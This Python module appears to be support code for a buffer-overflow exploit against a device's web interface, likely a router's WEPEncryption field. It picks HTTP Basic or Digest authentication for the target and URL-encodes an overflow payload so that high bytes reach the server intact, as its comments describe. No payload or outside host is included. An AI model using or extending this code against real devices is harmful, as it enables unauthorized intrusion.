import requests
import urllib.parse
from requests.auth import HTTPDigestAuth
from requests.auth import HTTPBasicAuth


def create_http_auth(target_ip, target_port, username, password):
    """
    Create an authorization object that can be passed with a requests
    get/post request. The authorization type is determined by requesting the
    root page and parsing the WWW-Authenticate field in the headers. Only
    basic and digest authentication are supported.

    :param target_ip: Targets IP address.
    :type target_ip: str

    :param target_port: Targets listening port.
    :type target_port: str

    :param username: Authorized username.
    :type username: str

    :param password: Users password.
    :type password: str

    :return: Authorization object or None.
    :rtype: requests.auth.HTTPDigestAuth or requests.auth.HTTPBasicAuth or None
    """
    response = requests.get('http://%s:%s' % (target_ip, target_port))
    www_auth = response.headers['WWW-Authenticate'].lower()

    if 'basic' in www_auth:
        return HTTPBasicAuth(username, password)
    elif 'digest' in www_auth:
        return HTTPDigestAuth(username, password)

    return None


def url_encode(overflow):
    """
    Perform special url encoding that fixes up the invalid encode characters
    and url encodes the rest.

    :param overflow: Overflow to URL encode.
    :type overflow: bytes

    :return: Encoded overflow with parameters.
    :rtype: str
    """
    invalid_encode_characters = {'%2F': '/', '%5F': '_', '%2E': '.', '%2D': '-',
                                 '%3F': '?', '%26': '&', '%3d': '=', '%7E': '~',
                                 '%40': '@', '%23': '#', '%24': '$', '%25': '%',
                                 '%5E': '^', '%3A': ':'}

    # This "encodes" bytes that are in the extended ASCII range because when
    # they are urlencoded it messes up the exploit. Bytes 128 (0x80) and above
    #  are converted to their % version. 0x9C becomes %9C so the actual call to
    # url encode wont do anything with it, but the byte still makes it to the
    # server.
    temp_overflow = []
    for byte in overflow:
        if byte < 128:
            temp_byte = bytes(chr(byte), 'utf8')
        else:
            temp_byte = b'%' + bytes(hex(byte)[2:], 'utf8')
        temp_overflow.append(temp_byte)

    overflow = b''.join(temp_overflow)

    encoded_overflow = urllib.parse.urlencode({b'WEPEncryption': overflow})

    for bad_encoding in invalid_encode_characters.keys():
        if bad_encoding in encoded_overflow:
            encoded_overflow = encoded_overflow.replace(
                    bad_encoding, invalid_encode_characters[bad_encoding])
    return encoded_overflow
